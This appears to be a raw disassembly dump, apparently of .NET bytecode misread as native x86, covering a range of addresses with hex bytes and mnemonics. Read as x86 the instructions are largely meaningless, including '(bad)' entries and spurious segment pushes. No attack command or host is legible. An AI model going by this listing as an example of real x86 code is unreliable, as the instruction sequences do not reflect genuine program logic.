  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
  402b8b:	14 20                	adc    $0x20,%al
  402b8d:	c0 00 00             	rolb   $0x0,(%eax)
  402b90:	00 16                	add    %dl,(%esi)
  402b92:	6f                   	outsl  %ds:(%esi),(%dx)
  402b93:	39 00                	cmp    %eax,(%eax)
  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 ba 21 00       	and    $0x21ba72,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 c8                	jb     0x403042
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 d2 21 00       	and    $0x21d272,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
